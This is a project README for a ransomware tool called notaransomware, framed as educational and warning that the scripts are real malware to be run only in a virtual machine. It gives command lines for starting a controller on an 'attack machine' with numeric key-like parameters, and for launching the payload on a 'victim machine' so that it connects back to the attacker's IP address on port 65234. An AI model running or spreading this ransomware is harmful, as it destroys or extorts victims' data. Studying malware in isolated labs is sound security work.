# Educational Project: Basic Ransomware called `notaransomware`

## :warning: Word of warning :warning:

USE THIS PROJECT AT YOUR OWN RISK, THIS PROJECT IS ACTUAL MALWARE AND CAN COMPLETELY NUKE YOUR DATA.

DO NOT RUN ANY OF THESE SCRIPTS OUTSIDE A VIRTUAL MACHINE ENVIRONMENT.

**NO ONE BUT YOU IS RESPONSIBLE FOR YOUR ACTIONS!!**

## Executing the controller:

On your attack machine, assuming in a 'venv' with the `refvars`, `sympy` and `numba` packages installed, and further assuming we're on linux:

```bash
python ./src/controller.py 65234 13407807929942597099574024998205846127479365820592393377723561443721777590085634851032779478353637896850947272540608796923748597753481071826673937866382937 5442747183548115617697901354231477339143705819476632031081032525882694828976487610226161193249524470800498328768013483131899816767661000286051244305962545 13407807929942597099574024998205846127479365820592393377723561443721777590085634851032779478353637896850947272540608796923748597753481071826673937866382937
```

## Executing the payload:

On your victim machine, assuming in a 'venv' with the `refvars`, `sympy` and `numba` packages installed, and further assuming we're on linux:

```bash
python ./src/notaransomware.py <<<your attacker ip>>> 65234 "?" "?"
```

**Make sure to replace `<<<your attacker ip>>>` with the real-life IPv4 address of your attacker machine.**

## Have fun :D
